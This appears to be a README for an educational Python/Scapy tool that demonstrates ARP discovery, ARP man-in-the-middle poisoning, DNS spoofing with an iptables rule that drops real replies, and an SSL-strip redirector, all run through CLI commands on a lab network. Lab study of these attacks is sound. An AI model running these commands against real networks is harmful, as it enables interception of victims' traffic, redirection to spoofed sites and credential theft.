# Educational ARP & DNS Manipulation Tool

This project provides a controlled environment to study ARP and DNS weaknesses inside an **authorized lab network** (e.g., host-only or isolated NAT).

Implemented demos:
- `discover` — ARP network discovery
- `arp-demo` — ARP MITM between a victim and router
- `dns-demo` — DNS spoofing for a target domain
- `ssl-strip` — HTTPS listener that redirects or serves custom HTML

---

## Requirements

- Kali Linux recommended (other Linux may work)
- Python 3.8+
- System packages (Kali):
  ```
  sudo apt update && sudo apt upgrade -y
  sudo apt install -y python3 python3-pip python3-venv tcpdump libpcap-dev
  ```
- Python deps:
  ```
  pip install scapy
  ```

---

## Installation

```bash
cd educational_arp_dns_tool
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install scapy
```

---

## Running the CLI

Run with sudo/root for packet features:

```bash
sudo python3 -m tool.cli --help
```

Interactive mode (no args) shows a numbered menu and prompts for fields:

```bash
sudo python3 -m tool.cli
```

Subcommands:
```
discover   # ARP sweep of a CIDR
arp-demo   # ARP MITM between victim and router
dns-demo   # DNS spoof a target domain
ssl-strip  # HTTPS redirector or custom HTML
```

Default interface is `eth0` for demos that send/receive packets; override with `-I`.

---

## Interactive CLI (Menu Mode)

If you run the CLI with no arguments, it displays a numbered menu and then asks for the required inputs for the selected demo.

Example session:

```
$ sudo python3 -m tool.cli
Interactive menu:
  1) discover - ARP scan a subnet
  2) arp-demo - ARP MITM between victim and router
  3) dns-demo - DNS spoof a target domain
  4) ssl-strip - HTTPS redirector or HTML response
  5) help - Show CLI help
  6) exit - Exit
Select an option: 1
IP range (CIDR) [192.168.178.0/24]:
```

For interactive prompts, press Enter to accept the default (including the default `eth0` interface).

---

## Functionality Details

### Discover (`discover`)
Inputs:
- CIDR range (e.g., `192.168.178.0/24`)

How it works:
- Sends ARP who-has requests to the broadcast MAC for the entire CIDR.
- Collects replies and prints a table of IP/MAC pairs.

Example output:
```
[i] Starting ARP scan on range: 192.168.178.0/24
[i] ARP scan finished, found 2 hosts.

[*] Discovered hosts on the lab network:
    IP address        MAC address
    --------------    -----------------
    192.168.178.1     08:00:27:11:22:33
    192.168.178.10    08:00:27:aa:bb:cc
```

### ARP Lab (`arp-demo`)
Inputs:
- Victim IP
- Router/gateway IP
- Interface (`-I`, default `eth0`)
- Optional: poison count (`-c`), interval (`-i`)

How it works:
- Resolves victim and router MACs via ARP.
- Sends spoofed ARP replies to both endpoints so they map the other IP to the attacker MAC.
- Forwards Ethernet frames between victim and router so traffic continues while passing through the attacker.

### DNS Lab (`dns-demo`)
Inputs:
- Target domain (e.g., `example.com`)
- Optional: spoof IP (defaults to attacker interface IP)
- Optional: victim IP filter (`-v`)
- Interface (`-I`, default `eth0`)

How it works:
- Sniffs UDP/53 DNS queries on the chosen interface.
- Matches queries for the target domain (optionally only from one victim IP).
- Sends a forged DNS response pointing to the spoof IP.
- If a victim IP is provided, inserts an iptables rule to drop that victim's real DNS replies so spoofing wins the race.

### SSL Strip (`ssl-strip`)
Inputs:
- Target host (e.g., `demo.local`)
- Optional: bind IP (`-b`, defaults to interface IP)
- Interface (`-I`, default `eth0`)
- Optional: `--html` or `--html-file` to serve custom HTML

How it works:
- Binds to TCP/443 with a self-signed certificate.
- Redirect mode: replies with a 301 to `http://<target-host>`.
- HTML mode: replies with a 200 and your custom HTML.

It does not reroute traffic by itself; you must direct the victim to the attacker (hosts file, DNS spoof, or MITM routing). HSTS-preloaded sites will not downgrade.

---

## Examples

### Discover
```bash
sudo python3 -m tool.cli discover -r 192.168.178.0/24
```

### ARP poisoning demo
```bash
sudo python3 -m tool.cli arp-demo 192.168.178.10 192.168.178.1 -I eth0 -c 5 -i 1
```
- `-I` interface; `-c` initial poison bursts; `-i` interval while running.

### DNS spoofing demo
```bash
sudo python3 -m tool.cli dns-demo example.com -s 192.168.178.76 -I eth0
```
- Add `-v <victim-ip>` to only spoof one host.

### SSL strip demo (lab hostname)
```bash
# attacker terminal 1: plain HTTP target
sudo python3 -m http.server 80

# attacker terminal 2: SSL redirector (301 to HTTP)
sudo python -m tool.cli ssl-strip demo.local -b 192.168.178.76 -I eth0

# victim: map hostname to attacker IP
echo "192.168.178.76 demo.local" | sudo tee -a /etc/hosts
```
Browse to `https://demo.local` from the victim, accept the cert warning, and you should be redirected to `http://demo.local`. HSTS-preloaded sites (e.g., google.com, example.com) will not downgrade.

### SSL strip demo (custom HTML)
```bash
sudo python -m tool.cli ssl-strip demo.local -b 192.168.178.76 -I eth0 --html "<h1>test passed</h1>"
```
